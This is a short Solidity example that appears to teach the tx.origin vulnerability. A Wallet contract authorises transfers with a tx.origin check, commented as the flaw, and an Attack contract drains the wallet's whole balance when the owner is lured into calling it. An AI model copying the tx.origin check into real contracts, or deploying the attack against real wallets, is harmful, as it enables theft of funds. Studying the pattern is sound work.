contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // This function allows the owner to transfer its found to a specified account _to
        require(tx.origin == owner); // here there is the vulnerability

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(address _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }
    
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}